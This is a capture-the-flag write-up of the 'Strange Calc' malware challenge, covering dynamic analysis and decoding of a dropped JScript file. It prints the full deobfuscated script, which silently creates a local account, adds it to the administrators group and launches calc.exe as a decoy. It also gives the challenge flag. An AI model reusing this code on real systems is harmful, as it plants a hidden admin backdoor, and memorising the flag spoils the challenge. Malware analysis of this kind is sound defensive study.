## Name: Strange Calc
#### Author: @JohnHammond
#### Category: Malware
#### Difficulty: N/D
#### Description: I got this new calculator app from my friend! But it's really weird, for some reason it needs admin permissions to run??

NOTE: Archive password is strange_calc

## Procedure
I did a dynamic analysis for this chall using [AnyRun](https://app.any.run), here we can see the file ```5t0vNHm1fe.jse``` created after run the ```.exe```.

<img width="1386" alt="Screenshot 2025-02-11 at 7 11 10 PM" src="https://github.com/user-attachments/assets/f28f8bf2-2c4d-4d01-bd33-c6160462033d" />

This create a local user and then add the new user into localgroup ```administrators```, I have recovered the ```5t0vNHm1fe.jse``` file, we can recover the original text with Cyberchef using ```Microsoft Script Decoder``` module

```
function a(b){var c="",d=b.split("\n");for(var e=0;e<d.length;e++){var f=d[e].replace(/^\s+|\s+$/g,'');if(f.indexOf("begin")===0||f.indexOf("end")===0||f==="")continue;var g=(f.charCodeAt(0)-32)&63;for(var h=1;h<f.length;h+=4){if(h+3>=f.length)break;var i=(f.charCodeAt(h)-32)&63,j=(f.charCodeAt(h+1)-32)&63,k=(f.charCodeAt(h+2)-32)&63,l=(f.charCodeAt(h+3)-32)&63;c+=String.fromCharCode((i<<2)|(j>>4));if(h+2<f.length-1)c+=String.fromCharCode(((j&15)<<4)|(k>>2));if(h+3<f.length-1)c+=String.fromCharCode(((k&3)<<6)|l)}}return c.substring(0,g)}var m="begin 644 -\nG9FQA9WLY.3(R9F(R,6%A9C$W-3=E,V9D8C(X9#<X.3!A-60Y,WT*\n`\nend";var n=a(m);var o=["net user LocalAdministrator "+n+" /add","net localgroup administrators LocalAdministrator /add","calc.exe"];var p=new ActiveXObject('WScript.Shell');for(var q=0;q<o.length-1;q++){p.Run(o[q],0,false)}p.Run(o[2],1,false);
```

Here we can see an interesting encoded text ```begin 644 -\nG9FQA9WLY.3(R9F(R,6%A9C$W-3=E,V9D8C(X9#<X.3!A-60Y,WT*\n`\nend```, reading about it and using [dcode.fr](https://www.dcode.fr/cipher-identifier) we have identified the encoded text as ```UUencode```.

<img width="1103" alt="Screenshot 2025-02-11 at 7 18 19 PM" src="https://github.com/user-attachments/assets/6b66895c-fe38-44cd-a9f4-a2150e05756b" />

flag ```flag{9922fb21aaf1757e3fdb28d7890a5d93}```
